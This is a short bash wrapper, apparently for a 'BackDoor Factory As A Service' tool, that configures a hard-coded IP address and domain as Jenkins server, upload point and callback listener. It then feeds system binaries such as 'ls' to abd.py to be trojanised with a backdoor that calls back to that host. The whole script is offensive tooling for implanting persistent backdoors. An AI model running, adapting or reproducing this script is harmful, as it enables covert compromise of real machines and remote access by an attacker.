#!/bin/bash
### BackDoor Factory As A Serive Settings (BDFAAS) ###
##Example for abd.py command
##python abd.py /home/shadghost/tools/Auto-Backdoor/ls mail.riverservice.website put.php mail.riverservice.website:8080 auth auto_mail 0 0 8888 mail.riverservice.website


## EDIT STARTING HERE ##
#Enable ABD wiht 1
ABD_E=1 ##Not needed in wrapper, this is ment for a diffrent script

#ABD location
ABD_LOC="abd.py"

#What to backdoor note:/bin/bash fails, don't know why
array=("ls_bd")  ##recomended ones, too many may make it bad

#Jenkins
J_URL="104.236.150.101:8080"
J_PROJECT="auto_mail"
J_TOKEN="auth"

#PUT LOC
P_URL="104.236.150.101"
P_LOC="put.php"

#Listner
L_IP="104.236.150.101"
L_PORT="8888" ##DECREPED
## DON'T EDIT BELOW HERE ##
### ABD SubCommand


###python abd.py $BINARY $PLACE TO UPLOAD / DOWNLOAD $PUT SCRIPT LOCATION $JENKINS URL $Jenkins token $Jenkins project location $0 for linux $not used yet, always 0 $Backdoor callback port $backdoor callback ip / domain name
curr_ip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'`
echo "Array items:"
for item in ${array[*]}
do
	printf "   %s\nBackdooring: " `which $item`
	python $ABD_LOC `which $item` $P_URL $P_LOC $J_URL $J_TOKEN $J_PROJECT 0 0 $L_PORT $L_IP $curr_ip
done
